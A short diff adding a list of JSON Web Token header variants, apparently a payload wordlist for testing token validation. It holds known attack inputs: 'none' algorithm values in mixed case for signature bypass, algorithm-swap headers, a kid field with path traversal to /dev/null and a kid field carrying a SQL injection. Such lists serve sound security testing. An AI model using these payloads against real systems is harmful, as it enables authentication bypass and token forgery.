@@ -1,0 +1,12 @@
+{"alg":"none"}
+{"alg":"None"}
+{"alg":"NONE"}
+{"alg":"nOnE"}
+{"alg":"RS256","typ":"JWT"}
+{"alg":"HS256","typ":"JWT"}
+{"alg":"ES256","typ":"JWT"}
+{"alg":"PS256","typ":"JWT"}
+{"alg":"none","typ":"JWT"}
+{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}
+{"alg":"HS256","typ":"JWT","kid":"key.txt"}
+{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'secret'--"}
